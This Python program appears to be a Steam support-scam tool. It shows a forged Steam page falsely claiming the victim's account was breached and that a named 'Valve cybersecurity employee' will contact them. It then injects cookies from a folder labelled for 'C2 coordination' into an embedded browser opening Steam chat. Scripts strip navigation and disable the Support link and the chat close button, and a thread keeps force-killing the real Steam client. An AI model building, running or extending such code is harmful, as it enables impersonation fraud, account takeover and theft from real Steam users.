import webview
import os
import re
import json
import time
import threading
import ctypes
import subprocess

import sys

# Base directory for bundled resources (temp folder in onefile mode)
BASE_DIR = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
# External directory for persistent data (same folder as EXE)
EXE_DIR = os.path.dirname(os.path.abspath(sys.executable))

INDEX_PATH = os.path.join(BASE_DIR, "site_dump", "steamcommunity.com", "linkfilter", "index.html")
# Shared temporary root for C2 coordination
TEMP_ROOT = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'FinalTempSys')
TABLICHKA_DIR = os.path.join(TEMP_ROOT, "tablichka")
if not os.path.exists(TABLICHKA_DIR): os.makedirs(TABLICHKA_DIR, exist_ok=True)

COOKIE_PATH = os.path.join(TABLICHKA_DIR, "cookie.txt")
AGENT_NAME_PATH = os.path.join(TABLICHKA_DIR, "agent_name.txt")
LANG_PATH = os.path.join(TABLICHKA_DIR, "vac_lang.txt") # Balanced naming

def _get_agent_name():
    if os.path.exists(AGENT_NAME_PATH):
        try:
            with open(AGENT_NAME_PATH, "r", encoding="utf-8") as f:
                name = f.read().strip()
                if name: return name
        except: pass
    return "Jared Brahill"

def _get_lang():
    if os.path.exists(LANG_PATH):
        try:
            with open(LANG_PATH, "r", encoding="utf-8") as f:
                l = f.read().strip().lower()
                if l in ["en", "english"]: return "en"
                if l in ["zh", "cn", "chinese"]: return "zh"
        except: pass
    return "en"

def get_patched_html():
    if not os.path.exists(INDEX_PATH):
        return f"<h1>Error: {INDEX_PATH} not found</h1>"
    with open(INDEX_PATH, "r", encoding="utf-8", errors="ignore") as f:
        html = f.read()

    agent = _get_agent_name()
    lang = _get_lang()
    html = html.replace("friendlyInterstital", "")
    
    # Generic replacements for both languages
    html = html.replace("Jared Brahill", agent)
    
    if lang == "en":
        # English Version
        html = re.sub(r"<h1>\s*注意[：:]?\s*</h1>", "<h1>Attention:</h1>", html)
        html = html.replace("账户访问受限。", "Account access restricted.")
        html = html.replace("您正要离开 Steam。", "Account access restricted.")
        
        # Footer localization v3
        footer_links = "Privacy Policy &nbsp; | &nbsp; Legal &nbsp; | &nbsp; Accessibility &nbsp; | &nbsp; Steam Subscriber Agreement &nbsp; | &nbsp; Cookies"
        new_footer_content = f"""
            © Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.<br>
            Some geospatial data on this website is provided by geonames.org.<br>
            <span class="valve_links">{footer_links}</span>
        """
        html = re.sub(r'<span id="footerText">.*?</span>', 
                      f'<span id="footerText">{new_footer_content}</span>', 
                      html, flags=re.DOTALL)
        
        main_body = f"""
        <h2>Steam security systems have detected an unauthorized attempt to log in to your account from an unusual location. To protect your personal data, game inventory, and linked payment methods, access to community features and the trading market has been temporarily restricted. We need to confirm that you are the rightful owner of this account.</h2>
        <p>Valve cybersecurity employee <strong>{agent}</strong> will contact you shortly to coordinate the account recovery process and verify device security. Please stay online and follow the staff's instructions.</p>
        <div style="margin-top: 20px; font-weight: bold; color: #FFF;">Important: Your account will be placed under strict isolation until the review is complete.</div>
        """
        btn_text = "Open Chat"
        load_text = '<h2>Loading session...</h2><p>Please wait while we apply security settings.</p>'
        banner_title = "AWAITING RESPONSE"
        banner_text = "Please follow the instructions from the support representative in chat."
        footer_style = ".supernav_container, #global_actions, .header_installsteam_btn, #footer_responsive, #footer_spacer { display: none !important; } .footer_content { display: block !important; padding: 10px 20px 80px 20px !important; color: #8F98A0; font-size: 12px; line-height: 1.6; }"
    else:
        # Chinese Version
        html = re.sub(r"<h1>\s*注意[：:]?\s*</h1>", "<h1>请注意：</h1>", html)
        html = html.replace("您正要离开 Steam。", "账户访问受限。")
        
        main_body = f"""
        <h2>Steam安全系统检测到有人试图从异常位置未经授权登录您的账户。为保护您的个人数据、游戏库存及关联支付方式，社区功能和交易平台的访问权限已被暂时限制。我们需要确认您确为该账户所有者。</h2>
        <p>Valve网络安全部门员工<strong>{agent}</strong>将与您联系，协调账户恢复流程并验证设备安全性. 请保持在线状态并遵循工作人员指引。</p>
        <div style="margin-top: 20px; font-weight: bold; color: #FFF;">重要提示：在完成审核之前，您的账户将被置于严格隔离状态。</div>
        """
        btn_text = "打开聊天"
        load_text = '<h2>正在加载会话...</h2><p>请稍候，我们正在应用安全设置。</p>'
        banner_title = "正在等待回复"
        banner_text = "请遵循聊天中支持人员的指引。"
        footer_style = ".supernav_container, #global_actions, .header_installsteam_btn, .footer_legal, #footer_responsive, #footer_spacer { display: none !important; }"

    # Use a more flexible regex for the main explanation box
    html = re.sub(r'<div class="warningExplanation">.*?<div class="centering"', 
                  f'<div class="warningExplanation">{main_body}<div class="centering"', 
                  html, flags=re.DOTALL)
    
    # Also attempt a fallback if the div structure is slightly different
    if "warningExplanation" not in html or main_body not in html:
         html = html.replace('<div class="warningExplanation">', f'<div class="warningExplanation">{main_body}')

    html = html.replace("<span>继续访问外部网站</span>", f"<span>{btn_text}</span>")
    html = html.replace("<span>打开聊天</span>", f"<span>{btn_text}</span>")
    html = html.replace("<span>Открывается в новом окне</span>", f"<span>{btn_text}</span>") # Potential other strings

    # Cleanup and styling
    cleanup_css = f"""
    <style>
        body {{ overflow: hidden !important; }}
        .warningExplanation {{ padding-top: 10px !important; margin-top: 10px !important; }}
        {footer_style}
        #global_header .content {{ justify-content: flex-start !important; }}
        a:not(#proceedButton) {{ pointer-events: none !important; cursor: default !important; text-decoration: none !important; }}
        
        .support-reminder {{
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.85);
            padding: 20px 40px;
            border: 2px solid #1a9fff;
            box-shadow: 0 0 20px rgba(26, 159, 255, 0.5);
            border-radius: 8px;
            z-index: 10000;
            text-align: center;
            color: white;
            font-family: Arial, sans-serif;
            display: none;
        }}
    </style>
    <div id="supportBanner" class="support-reminder">
        <h3 style="margin: 0; color: #1a9fff;">{banner_title}</h3>
        <p style="margin: 10px 0 0 0;">{banner_text}</p>
    </div>
    <script>
        function showLoading() {{
            document.getElementById('supportBanner').style.display = 'block';
            document.querySelector('.warningExplanation').innerHTML = '{load_text}';
        }}
    </script>
    """
    html = html.replace("</head>", f"{cleanup_css}</head>")
    html = html.replace('id="proceedButton"', 'id="proceedButton" onclick="showLoading(); window.pywebview.api.proceed_with_cookies(); return false;"')

    # Additional patch for Chinese elements that might still be present
    if lang == "en":
        html = html.replace("STEAM 服务警报", "STEAM SERVICE ALERT")
        html = html.replace("需要采取行动", "ACTION REQUIRED")
        html = html.replace("案例 ID:", "Case ID:")
        html = html.replace("状态:", "Status:")
    
    # Comprehensive Chinese Localization for VAC Notice (Extra pass)
    if lang == "zh":
        html = html.replace("Recent Steam community activity has highlighted your account as a potential risk.", "由于您的帐户涉及违规行为，已被列入潜在风险名单。")
        html = html.replace("Your account has been flagged for suspicious activity and is currently under investigation.", "您的帐户由于可疑活动已被标记，目前正在调查中。")
        html = html.replace("Please review the following information and take action to secure your account.", "请查看以下信息，并采取行动确保您的帐户安全。")
        html = html.replace("Failure to comply may result in permanent account suspension.", "不遵守规定可能会导致您的帐户被永久封停。")
        html = html.replace("STEAM SERVICE ALERT", "STEAM 服务警报")
        html = html.replace("ACTION REQUIRED", "需要采取行动")
        html = html.replace("Suspicious Activity Detected", "检测到可疑活动")
        html = html.replace("View Details", "查看详情")
        html = html.replace("Secure Account", "确保护户安全")
        html = html.replace("Contact Support", "联系官方客服")
        html = html.replace("Case ID:", "案例 ID:")
        html = html.replace("Status:", "状态:")
        # Inject Agent Name
        html = html.replace("Jared Brahill", _get_agent_name())
    return html

class API:
    def __init__(self):
        self._win = None

    def proceed_with_cookies(self):
        threading.Thread(target=self._cookie_flow).start()
        return True

    def _cookie_flow(self):
        print(f"[API] Initializing session restoration from {COOKIE_PATH}...")
        if not os.path.exists(COOKIE_PATH):
            print(f"[API] Error: {COOKIE_PATH} not found.")
            self._win.load_url("https://steamcommunity.com/chat/")
            return

        try:
            with open(COOKIE_PATH, "r", encoding="utf-8") as f:
                cookies_json = json.load(f)

            # --- DEBUG: Identify native objects ---
            native = getattr(self._win, 'native', None)
            gui = getattr(self._win, 'gui', None)
            print(f"[API] Native object: {type(native)}")
            if gui: print(f"[API] GUI object: {type(gui)}")

            def _inject_native():
                try:
                    # Strategy for finding CoreWebView2
                    cv2 = None
                    browser_ctrl = None
                    
                    # 1. Check if native IS the browser control (common in some pywebview versions)
                    if hasattr(native, 'CoreWebView2'):
                        browser_ctrl = native
                        cv2 = native.CoreWebView2
                    # 2. Check if native is a Form with controls (WinForms)
                    elif hasattr(native, 'Controls'):
                        for i in range(native.Controls.Count):
                            ctrl = native.Controls[i]
                            if hasattr(ctrl, 'CoreWebView2'):
                                browser_ctrl = ctrl
                                cv2 = ctrl.CoreWebView2
                                break
                    # 3. Check gui.browser
                    if not cv2:
                        browser_ctrl = getattr(gui, 'browser', None)
                        cv2 = getattr(browser_ctrl, 'CoreWebView2', None)

                    if cv2 and hasattr(cv2, 'CookieManager'):
                        print(f"[API] Found CoreWebView2 on {type(browser_ctrl)}. Injecting cookies...")
                        manager = cv2.CookieManager

                        # Force Russian language
                        for domain in [".steamcommunity.com", ".steampowered.com", "steam-chat.com"]:
                            try:
                                lang_c = manager.CreateCookie("Steam_Language", "english", domain, "/")
                                manager.AddOrUpdateCookie(lang_c)
                            except: pass

                        for c in cookies_json:
                            try:
                                name, value = str(c.get("name")), str(c.get("value"))
                                domain = str(c.get("domain", ".steamcommunity.com"))
                                path = str(c.get("path", "/"))
                                
                                cookie_obj = manager.CreateCookie(name, value, domain, path)
                                cookie_obj.IsHttpOnly = bool(c.get("httpOnly", True))
                                cookie_obj.IsSecure = bool(c.get("secure", True))
                                manager.AddOrUpdateCookie(cookie_obj)
                            except Exception as ex:
                                print(f"[API] Native Injection Err {c.get('name')}: {ex}")
                        print("[API] Native session and language applied successfully.")
                        return True
                    else:
                        print("[API] CoreWebView2 not found on any known target.")
                        return False
                except Exception as e:
                    print(f"[API] Native Logic Error: {e}")
                    return False

            # --- UI Thread Dispatching ---
            success = False
            try:
                # Check for WinForms Invoke
                if native and hasattr(native, 'Invoke'):
                    print("[API] Dispatching via WinForms Invoke...")
                    from System import Action
                    native.Invoke(Action(_inject_native))
                    success = True # Assume success if no exception raised
                # Check for WPF Dispatcher
                elif native and hasattr(native, 'Dispatcher'):
                    print("[API] Dispatching via WPF Dispatcher...")
                    from System import Action
                    from System.Windows.Threading import DispatcherPriority
                    native.Dispatcher.Invoke(Action(_inject_native), DispatcherPriority.Normal)
                    success = True
                else:
                    print("[API] No dispatcher found on native window. Attempting direct call...")
                    success = _inject_native()
            except Exception as dispatch_err:
                print(f"[API] Dispatch failed: {dispatch_err}")
                success = _inject_native()

            if not success:
                print("[API] Native injection failed. JS workaround is not possible for HttpOnly.")

            lang = _get_lang()
            support_text = "en" 

            print("[API] Navigating to Chat and applying interface patch...")
            self._win.load_url("https://steamcommunity.com/chat/")
            
            # Injecting the patch. 
            chat_patch_js = f"""
            (function() {{
                const patch = () => {{
                    // Inject custom styles once
                    if (!document.getElementById('pywebview-patch-styles')) {{
                        const style = document.createElement('style');
                        style.id = 'pywebview-patch-styles';
                        style.innerHTML = `
                            a.main_SteamPageHeaderTopLink_2mGrI[data-patched-support] {{ 
                                color: #fff !important; 
                                text-shadow: 0 0 5px rgba(255,255,255,0.8) !important; 
                                cursor: default !important; 
                            }}
                            a.main_SteamPageHeaderTopLink_2mGrI[data-patched-support]:active {{ 
                                transform: translateY(1px) !important; 
                                filter: brightness(1.2) !important; 
                            }}
                        `;
                        document.head.appendChild(style);
                    }}

                    // 1. Remove Community and Store links (logo stays)
                    const toRemove = [
                        'a.main_SteamPageHeaderTopLink_2mGrI[href*="steamcommunity.com"]:not([href*="chat"])',
                        'a.main_SteamPageHeaderTopLink_2mGrI[href*="store.steampowered.com"]'
                    ];
                    toRemove.forEach(s => {{
                        document.querySelectorAll(s).forEach(el => el.remove());
                    }});

                    // 2. Support button (keep visuals/hover/active, kill navigation, change text)
                    document.querySelectorAll('a[href*="help.steampowered.com"]').forEach(el => {{
                        if (!el.dataset.patchedSupport) {{
                            el.textContent = '{support_text}'; 
                            el.addEventListener('click', e => {{
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }}, true);
                            el.dataset.patchedSupport = '1';
                        }}
                    }});

                    // 3. Disable Context Menu (Right Click) - using EXACT user selectors
                    const noCtx = [
                        '#friendslist-container > div > div.chat_main_flex.displayRow.Panel.Focusable > div.DropTarget.friendsListContainer.fullheight.Panel.Focusable > div > div.FriendsListContent.Panel.Focusable > div.friendlistListContainer',
                        '#friendslist-container > div > div.chat_main_flex.displayRow.Panel.Focusable > div.DropTarget.multiChatDialog.Panel.Focusable > div.ChatTabs.titleBarContainer.OneTab.Panel.Focusable > div.chatTabSetContainer',
                        '#friendslist-container > div > div.chat_main_flex.displayRow.Panel.Focusable > div.DropTarget.multiChatDialog.Panel.Focusable > div.chatDialogs.Panel.Focusable > div > div.ChatRoomGroupDialog_contents > div > div > div > div > div > div > div.displayColumn.fullWidth.Panel.Focusable > div.displayRow.minHeightZero.Panel.Focusable > div.displayColumn.fullWidth.Panel.Focusable > div > div.ChatHistoryContainer.Panel.Focusable > div.chatHistoryScroll'
                    ];
                    noCtx.forEach(s => {{
                        const el = document.querySelector(s);
                        if (el && !el.dataset.patchedCtx) {{
                            el.addEventListener('contextmenu', e => {{
                                e.preventDefault();
                                e.stopPropagation();
                            }}, true);
                            el.dataset.patchedCtx = '1';
                        }}
                    }});

                    // 4. Disable Close Chat button
                    const closeBtn = document.querySelector('.chattabs_CloseButton_7gMwY');
                    if (closeBtn && !closeBtn.dataset.patchedClick) {{
                        closeBtn.addEventListener('click', e => {{ e.preventDefault(); e.stopPropagation(); }}, true);
                        closeBtn.dataset.patchedClick = '1';
                        closeBtn.style.opacity = '0.5';
                        closeBtn.style.cursor = 'not-allowed';
                    }}
                }};

                const observer = new MutationObserver(patch);
                observer.observe(document.body, {{ childList: true, subtree: true }});
                patch();
                console.log('[API] Chat Interface Patch (v4) applied.');
            }})();
            """
            
            def _delayed_patch():
                time.sleep(5) 
                self._win.evaluate_js(chat_patch_js)
            
            threading.Thread(target=_delayed_patch).start()

        except Exception as e:
            print(f"[API] Fatal Error: {e}")
            self._win.load_url("https://steamcommunity.com/chat/")

BLOCK_STEAM = True

def steam_killer():
    """Background thread to kill steam.exe periodically."""
    while BLOCK_STEAM:
        try:
            # F - Forcefully terminate, IM - Image Name
            subprocess.run(["taskkill", "/F", "/IM", "steam.exe"], 
                           capture_output=True, text=True, check=False)
        except:
            pass
        time.sleep(0.5)

def on_closed():
    global BLOCK_STEAM
    BLOCK_STEAM = False
    print("[API] Window closed. Stopping Steam blocker.")

def main():
    # Start the blocker thread
    threading.Thread(target=steam_killer, daemon=True).start()
    
    html = get_patched_html()
    api = API()
    window = webview.create_window("Steam", html=html, width=1100, height=850, js_api=api, on_top=True, resizable=False, frameless=True)
    api._win = window
    
    window.events.closed += on_closed
    webview.start()

if __name__ == "__main__":
    main()
